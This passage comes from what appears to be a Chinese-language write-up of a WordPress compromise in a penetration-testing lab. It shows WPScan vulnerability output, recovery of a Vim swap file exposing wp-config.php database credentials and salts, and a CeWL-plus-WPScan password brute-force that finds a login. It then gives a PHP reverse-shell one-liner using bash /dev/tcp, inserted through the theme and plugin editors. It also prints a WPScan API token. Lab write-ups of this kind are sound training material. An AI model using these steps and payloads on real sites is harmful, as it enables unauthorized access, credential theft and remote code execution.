 | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955
 |
 | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8
 |
 | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492
 |
 | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e
 |
 | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/gutenberg/pull/45045/files
 |
 | [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
 |
 | [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-2-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Content Injection
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.3.2 - Denial of Service via Cache Poisoning
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/6d80e09d-34d5-4fda-81cb-e703d0e56e4f
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Subscriber+ Arbitrary Shortcode Execution
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/3615aea0-90aa-4f9a-9792-078a90af7f59
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Contributor+ Comment Disclosure
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39999
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Unauthenticated Post Author Email Disclosure
 |     Fixed in: 5.4.14
 |     References:
 |      - https://wpscan.com/vulnerability/19380917-4c27-4095-abf1-eba6f913b441
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5561
 |      - https://wpscan.com/blog/email-leak-oracle-vulnerability-addressed-in-wordpress-6-3-2/
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     Fixed in: 5.4.15
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     Fixed in: 5.4.15
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 5.4.16
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 5.4.16
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 5.4.16
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 5.4.18
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 5.4.18
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <> (0 / 137)   Checking Config Backups - Time: 00:00:00 <> (1 / 137)   Checking Config Backups - Time: 00:00:02 <> (3 / 137)   Checking Config Backups - Time: 00:00:02 <> (6 / 137)   Checking Config Backups - Time: 00:00:02 <> (8 / 137)   Checking Config Backups - Time: 00:00:02 <> (9 / 137)   Checking Config Backups - Time: 00:00:02 <> (11 / 137)  Checking Config Backups - Time: 00:00:03 <> (14 / 137)  Checking Config Backups - Time: 00:00:03 <> (16 / 137)  Checking Config Backups - Time: 00:00:03 <> (21 / 137)  Checking Config Backups - Time: 00:00:03 <> (24 / 137)  Checking Config Backups - Time: 00:00:03 <> (25 / 137)  Checking Config Backups - Time: 00:00:04 <> (27 / 137)  Checking Config Backups - Time: 00:00:04 <> (30 / 137)  Checking Config Backups - Time: 00:00:04 <> (32 / 137)  Checking Config Backups - Time: 00:00:04 <> (35 / 137)  Checking Config Backups - Time: 00:00:05 <> (37 / 137)  Checking Config Backups - Time: 00:00:05 <> (40 / 137)  Checking Config Backups - Time: 00:00:05 <> (41 / 137)  Checking Config Backups - Time: 00:00:05 <> (45 / 137)  Checking Config Backups - Time: 00:00:05 <> (46 / 137)  Checking Config Backups - Time: 00:00:06 <> (50 / 137)  Checking Config Backups - Time: 00:00:06 <> (51 / 137)  Checking Config Backups - Time: 00:00:06 <> (55 / 137)  Checking Config Backups - Time: 00:00:06 <> (56 / 137)  Checking Config Backups - Time: 00:00:07 <> (59 / 137)  Checking Config Backups - Time: 00:00:07 <> (60 / 137)  Checking Config Backups - Time: 00:00:07 <> (63 / 137)  Checking Config Backups - Time: 00:00:07 <> (64 / 137)  Checking Config Backups - Time: 00:00:07 <> (65 / 137)  Checking Config Backups - Time: 00:00:08 <> (68 / 137)  Checking Config Backups - Time: 00:00:08 <> (69 / 137)  Checking Config Backups - Time: 00:00:08 <> (70 / 137)  Checking Config Backups - Time: 00:00:08 <> (73 / 137)  Checking Config Backups - Time: 00:00:08 <> (74 / 137)  Checking Config Backups - Time: 00:00:09 <> (75 / 137)  Checking Config Backups - Time: 00:00:09 <> (78 / 137)  Checking Config Backups - Time: 00:00:09 <> (79 / 137)  Checking Config Backups - Time: 00:00:09 <> (80 / 137)  Checking Config Backups - Time: 00:00:09 <> (83 / 137)  Checking Config Backups - Time: 00:00:10 <> (84 / 137)  Checking Config Backups - Time: 00:00:10 <> (85 / 137)  Checking Config Backups - Time: 00:00:10 <> (88 / 137)  Checking Config Backups - Time: 00:00:10 <> (89 / 137)  Checking Config Backups - Time: 00:00:11 <> (90 / 137)  Checking Config Backups - Time: 00:00:11 <> (93 / 137)  Checking Config Backups - Time: 00:00:11 <> (94 / 137)  Checking Config Backups - Time: 00:00:11 <> (95 / 137)  Checking Config Backups - Time: 00:00:11 <> (98 / 137)  Checking Config Backups - Time: 00:00:12 <> (99 / 137)  Checking Config Backups - Time: 00:00:12 <> (100 / 137) Checking Config Backups - Time: 00:00:12 <> (103 / 137) Checking Config Backups - Time: 00:00:12 <> (104 / 137) Checking Config Backups - Time: 00:00:12 <> (105 / 137) Checking Config Backups - Time: 00:00:13 <> (108 / 137) Checking Config Backups - Time: 00:00:13 <> (109 / 137) Checking Config Backups - Time: 00:00:13 <> (110 / 137) Checking Config Backups - Time: 00:00:13 <> (113 / 137) Checking Config Backups - Time: 00:00:13 <> (114 / 137) Checking Config Backups - Time: 00:00:14 <> (115 / 137) Checking Config Backups - Time: 00:00:14 <> (118 / 137) Checking Config Backups - Time: 00:00:14 <> (119 / 137) Checking Config Backups - Time: 00:00:14 <> (120 / 137) Checking Config Backups - Time: 00:00:15 <> (123 / 137) Checking Config Backups - Time: 00:00:15 <> (124 / 137) Checking Config Backups - Time: 00:00:15 <> (125 / 137) Checking Config Backups - Time: 00:00:15 <> (128 / 137) Checking Config Backups - Time: 00:00:15 <> (129 / 137) Checking Config Backups - Time: 00:00:16 <> (130 / 137) Checking Config Backups - Time: 00:00:16 <> (133 / 137) Checking Config Backups - Time: 00:00:16 <> (134 / 137) Checking Config Backups - Time: 00:00:16 <> (135 / 137) Checking Config Backups - Time: 00:00:16 <> (137 / 137) 100.00% Time: 00:00:16

[i] Config Backup(s) Identified:

[!] http://10.10.110.100:65000/wordpress/.wp-config.php.swp
 | Found By: Direct Access (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 23

[+] Finished: Thu Jan 29 20:32:34 2026
[+] Requests Done: 177
[+] Cached Requests: 6
[+] Data Sent: 50.019 KB
[+] Data Received: 446.131 KB
[+] Memory used: 252.539 MB
[+] Elapsed time: 00:00:37

```

### Config Backup


```c
┌──(kali㉿kali)-[~/Downloads]
└─$ cat wp-config.php.swp 
b0VIM 8.1LZ_�
�3210#"! Utp`ad▒�`������V▒�����vZLH�/www/html/wordpress/wp-config.phputf-8
 �
  �
   �
    �

     B


      �
       �
        �
         �
          �
           �
            W
             �
U
Q
@
;
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have  * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key <!-- Good Job at Finding the VIM SWAP File! --> 
                                                                                                                                                        
翻译：                                                                                                                                                        你可以在任何时候更改这些值，以使所有现有的 Cookie 失效。这将强制所有用户重新登录。
你可以使用 WordPress.org 提供的密钥生成服务来生成这些值：
https://api.wordpress.org/secret-key/1.1/salt/
<!-- 干得漂亮，你找到了 VIM 的交换文件！ -->
```

#### 🧠swp 关键知识点（一定要记住）
`.swp` 是 **Vim 的内存镜像**，里面包含：

+ 明文的 `wp-config.php` 内容
+ 数据库用户名 / 密码
+ WordPress salts
+ 甚至可能有 **之前编辑时的旧版本**

👉 **你现在的目标只有一个：**

**把 swap 文件里的 wp-config.php 还原出来**

#### 恢复swp文件
### ✅ 第一步：把 swap 文件改成 Vim 认识的名字
在当前目录执行：

```plain
touch wp-config.php
mv wp-config.php.swp .wp-config.php.swp
```

确认一下：

```plain
ls -a
```

你应该能看到：

```plain
.wp-config.php.swp
wp-config.php
```

---

### ✅ 第二步：再用 Vim 打开原文件
```plain
vim wp-config.php

///Vim 会弹出类似下面的提示（几乎一模一样）：  
Swap file ".wp-config.php.swp" already exists!
While opening file "wp-config.php"

(1) Another program may be editing the same file.
(2) An edit session for this file crashed.

[R]ecover
[D]elete it
[Q]uit
[A]bort

选择R即可
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Downloads]
└─# cat wp-config.php

<!-- Good Job at Finding the VIM SWAP File! -->
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'shaun' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '`i4M-OPF-&:y_o`cJ.v!|=W:a_Haij>II.mI+JOJmgG,e|T:~]=#X $y53~>r=zp' );
define( 'SECURE_AUTH_KEY',  'vRZ$$_BulH8-Pp%E%r0|r8Lf|2NCj~-po#AII#^IRKy]/gzjNb8bAH;Drr|-Mt0-' );
define( 'LOGGED_IN_KEY',    '*u#~mm(H.9I1%knh{`7.]OlsF3zItg$i;RVd9oG3J&i+#WrvdS<S>nSBX{S)G4y`' );
define( 'NONCE_KEY',        'v%/@I3c8yIm2q/_jtCa~if*?E&mGe?CKE1.]|TOki8=acoL5]^xq<x5AU2V*QNK&' );
define( 'AUTH_SALT',        '<=y@F ]NRpB4b#aox6W<K)#W`Jv~6n<5!^@4Y[e` js<j-}$OcQl%1ynsgJCH?&Z' );
define( 'SECURE_AUTH_SALT', '{Xrv,GS#>7B({PjsgfyL} 7ct1roDs5~keDYg2ae}M6,e|+D#fVC(gA%O]{Pz[Y]' );
define( 'LOGGED_IN_SALT',   'c.T.hZjD5E9$><n?9/uav|G_9<U`^7n_cF0s1w[[|@Q:etFp}7^=Qgl~H?I{|a,A' );
define( 'NONCE_SALT',       'UAKOs%vl!RU S:reIECN^=uvXgV9PJSv(L4W+W.Q8]fR):P4Kk(@ML2}crn?W)TB' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */

define( 'WP_HTTP_BLOCK_EXTERNAL', true );
define( 'AUTOMATIC_UPDATER_DISABLED', true );
define( 'WP_AUTO_UPDATE_CORE', false );
define( 'WP_DEBUG', true );
define( 'WP_DEBUG_LOG', true );
/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

```plain
DB_NAME     = wordpress
DB_USER     = shaun
DB_PASSWORD = password
DB_HOST     = localhost
```

###  James密码爆破
#### 构建密码本
```c
cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks > words.txt
```

![](/image/prolabs/Dante-3.png)

这里一定要注意爆破参数别加`--password-attack xmlrpc` 

这**依赖 3 个前提**，缺一就全失败：

1️⃣ `/xmlrpc.php`**必须可用**  
2️⃣ XML-RPC **必须允许认证方法调用**  
3️⃣ 服务端 **不能主动阻断批量请求**

**从已经拿到的 **`**wp-config.php**`** 就能看出问题**

**现在已经恢复了配置文件，我们直接看事实**👇

```plain
define( 'WP_HTTP_BLOCK_EXTERNAL', true );
define( 'AUTOMATIC_UPDATER_DISABLED', true );
define( 'WP_AUTO_UPDATE_CORE', false );
define( 'WP_DEBUG', true );
```

**🔴**** 关键在这里**

`**WP_HTTP_BLOCK_EXTERNAL** **= true**`

**这在很多环境中意味着：**

+ **WordPress ****禁止对外部请求**
+ **XML-RPC 的某些调用（尤其是多请求 / system.multicall）  
**👉** ****会被直接拒绝或静默丢弃**

📌** ****WPScan 并不一定能准确区分：**

+ **“密码错误”**
+ **“请求被逻辑拒绝”**

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# wpscan --url http://10.10.110.100:65000/wordpress/ --usernames James --passwords ./words.txt --max-threads 50 --api-token "NEzNxgvCrcyIZN1aYoHxHyUda29vcAIcsbaCrFngLA0"
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]
[+] Started: Thu Jan 29 23:09:04 2026

Interesting Finding(s):

[+] Performing password attack on Wp Login against 1 user/s
Progress Time: 00:00:00 <> (0 / 468)  0.00%  ETA: ??:??:Trying James / ancestor Time: 00:00:00 <> (0 / 468)  0.0Trying James / wrapper Time: 00:00:00 <> (3 / 468)  0.64Trying James / CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/) Time: 00:00:00 <> (5 Trying James / and Time: 00:00:00 <> (6 / 468)  1.28%  ETrying James / modal Time: 00:00:00 <> (14 / 468)  2.99%Trying James / the Time: 00:00:00 <> (19 / 468)  4.05%  Trying James / menu Time: 00:00:00 <> (21 / 468)  4.48% Trying James / Team Time: 00:00:00 <> (32 / 468)  6.83% Trying James / Email Time: 00:00:00 <> (37 / 468)  7.90%Trying James / Close Time: 00:00:00 <> (44 / 468)  9.40%Trying James / Instagram Time: 00:00:01 <> (47 / 468) 10Trying James / web Time: 00:00:01 <> (49 / 468) 10.47%  Trying James / about Time: 00:00:01 <> (50 / 468) 10.68%Trying James / powered Time: 00:00:01 <> (54 / 468) 11.5Trying James / used Time: 00:00:01 <> (60 / 468) 12.82% Trying James / pages Time: 00:00:01 <> (70 / 468) 14.95%Trying James / credits Time: 00:00:01 <> (82 / 468) 17.5Trying James / NASA Time: 00:00:01 <> (85 / 468) 18.16% Trying James / primary Time: 00:00:01 <> (88 / 468) 18.8Trying James / object Time: 00:00:01 <> (89 / 468) 19.01Trying James / toggles Time: 00:00:02 <> (97 / 468) 20.7Trying James / Features Time: 00:00:02 <> (98 / 468) 20.Trying James / frameworks Time: 00:00:02 <> (99 / 468) 2Trying James / Post Time: 00:00:02 <> (100 / 468) 21.36%Trying James / team Time: 00:00:02 <> (103 / 468) 22.00%Trying James / Android Time: 00:00:02 <> (114 / 468) 24.Trying James / public Time: 00:00:02 <> (127 / 468) 27.1Trying James / Used Time: 00:00:02 <> (134 / 468) 28.63%Trying James / core Time: 00:00:02 <> (137 / 468) 29.27%Trying James / systems Time: 00:00:02 <> (138 / 468) 29.Trying James / simulations Time: 00:00:02 <> (142 / 468)Trying James / Groupon Time: 00:00:02 <> (143 / 468) 30.Trying James / but Time: 00:00:02 <> (144 / 468) 30.76% Trying James / has Time: 00:00:02 <> (145 / 468) 30.98% Trying James / its Time: 00:00:02 <> (149 / 468) 31.83% Trying James / development Time: 00:00:03 <> (150 / 468)Trying James / available Time: 00:00:03 <> (153 / 468) 3Trying James / His Time: 00:00:03 <> (156 / 468) 33.33% Trying James / diverse Time: 00:00:03 <> (167 / 468) 35.Trying James / System Time: 00:00:03 <> (173 / 468) 36.9Trying James / body Time: 00:00:03 <> (183 / 468) 39.10%Trying James / very Time: 00:00:03 <> (187 / 468) 39.95%Trying James / method Time: 00:00:03 <> (188 / 468) 40.1Trying James / creator Time: 00:00:03 <> (189 / 468) 40.Trying James / simple Time: 00:00:03 <> (191 / 468) 40.8Trying James / distribute Time: 00:00:03 <> (192 / 468) Trying James / Intuitive Time: 00:00:03 <> (194 / 468) 4Trying James / ruby Time: 00:00:03 <> (197 / 468) 42.09%Trying James / described Time: 00:00:13 <> (198 / 468) 4Trying James / Designed Time: 00:00:13 <> (199 / 468) 42Trying James / Uncategorized Time: 00:00:13 <> (200 / 46Trying James / teams Time: 00:00:14 <> (202 / 468) 43.16Trying James / met Time: 00:00:14 <> (209 / 468) 44.65% Trying James / because Time: 00:00:14 <> (215 / 468) 45.Trying James / forward Time: 00:00:14 <> (216 / 468) 46.Trying James / frustrated Time: 00:00:14 <> (230 / 468) Trying James / Dreaming Time: 00:00:14 <> (231 / 468) 49Trying James / lead Time: 00:00:14 <> (242 / 468) 51.70%Trying James / school Time: 00:00:14 <> (244 / 468) 52.1Trying James / experience Time: 00:00:14 <> (250 / 468) Trying James / understand Time: 00:00:14 <> (251 / 468) Trying James / solution Time: 00:00:14 <> (254 / 468) 54Trying James / extras Time: 00:00:14 <> (258 / 468) 55.1Trying James / functional Time: 00:00:14 <> (267 / 468) Trying James / only Time: 00:00:14 <> (284 / 468) 60.68%Trying James / business Time: 00:00:14 <> (287 / 468) 61Trying James / depth Time: 00:00:14 <> (288 / 468) 61.53Trying James / technologies Time: 00:00:15 <> (289 / 468Trying James / benefit Time: 00:00:15 <> (298 / 468) 63.Trying James / make Time: 00:00:15 <> (299 / 468) 63.88%Trying James / purpose Time: 00:00:15 <> (300 / 468) 64.Trying James / Information Time: 00:00:15 <> (304 / 468)Trying James / Technologies Time: 00:00:15 <> (311 / 468Trying James / major Time: 00:00:15 <> (326 / 468) 69.65Trying James / develop Time: 00:00:15 <> (334 / 468) 71.Trying James / IoT Time: 00:00:15 <> (337 / 468) 72.00% Trying James / desktop Time: 00:00:15 <> (338 / 468) 72.Trying James / graphical Time: 00:00:15 <> (339 / 468) 7Trying James / numeric Time: 00:00:15 <> (342 / 468) 73.Trying James / ESRI Time: 00:00:15 <> (349 / 468) 74.57%Trying James / engineering Time: 00:00:16 <> (350 / 468)Trying James / lets Time: 00:00:16 <> (354 / 468) 75.64%Trying James / open Time: 00:00:16 <> (362 / 468) 77.35%Trying James / quality Time: 00:00:16 <> (365 / 468) 77.Trying James / robust Time: 00:00:16 <> (374 / 468) 79.9Trying James / cool Time: 00:00:16 <> (381 / 468) 81.41%Trying James / few Time: 00:00:16 <> (387 / 468) 82.69% Trying James / learn Time: 00:00:16 <> (388 / 468) 82.90Trying James / Integrated Time: 00:00:16 <> (391 / 468) Trying James / implemented Time: 00:00:16 <> (392 / 468)Trying James / Rapid Time: 00:00:16 <> (399 / 468) 85.25Trying James / Manufacturing Time: 00:00:16 <> (400 / 46Trying James / Security Time: 00:00:16 <> (403 / 468) 86Trying James / Amazon Time: 00:00:16 <> (408 / 468) 87.1Trying James / copy Time: 00:00:16 <> (410 / 468) 87.60%Trying James / Adobe Time: 00:00:16 <> (413 / 468) 88.24Trying James / then Time: 00:00:16 <> (419 / 468) 89.52%[SUCCESS] - James / Toyota                              
Trying James / Toyota Time: 00:00:16 <> (424 / 918) 46.1Trying James / which Time: 00:00:16 <> (437 / 918) 47.60Trying James / downloaded Time: 00:00:16 <> (438 / 918) Trying James / through Time: 00:00:16 <> (441 / 918) 48.Trying James / When Time: 00:00:16 <> (444 / 918) 48.36%Trying James / Once Time: 00:00:16 <> (448 / 918) 48.80%Trying James / Anywhere Time: 00:00:17 <> (449 / 918) 48Trying James / Anywhere Time: 00:00:17 <> (450 / 918) 49.01%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: James, Password: Toyota

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 17

[+] Finished: Thu Jan 29 23:09:35 2026
[+] Requests Done: 595
[+] Cached Requests: 40
[+] Data Sent: 207.494 KB
[+] Data Received: 2.586 MB
[+] Memory used: 261.023 MB
[+] Elapsed time: 00:00:30

```

 Username: James, Password: Toyota

#### 反弹shell
##### 主题反弹shell
进入“外观”->“主题编辑器”->“index 模板”，添加以下 PHP 反向 shell：

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ip/4444 0>&1'"); ?>
```

![](/image/prolabs/Dante-4.png)、

+ WordPress 在你 **修改主题 / 插件 PHP 文件后**
+ 会立刻：
    1. 发起一个 **HTTP 请求回到自己**
    2. 加载你刚改的 PHP
    3. 检查是否 **fatal error / 白屏**

如果它 **访问不到自己** 或 **请求被阻断**：

👉 **它认为“改动可能会把站点搞崩”**  
👉 **于是自动撤销你的代码**

** **👉** 这台靶机明确在“防后台直接 RCE”，逼你换路子。**

##### 插件反弹shell
![](/image/prolabs/Dante-5.png)

先把插件给关了

插件编辑器插入

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ip/4444 0>&1'"); ?>
```

![](/image/prolabs/Dante-6.png)

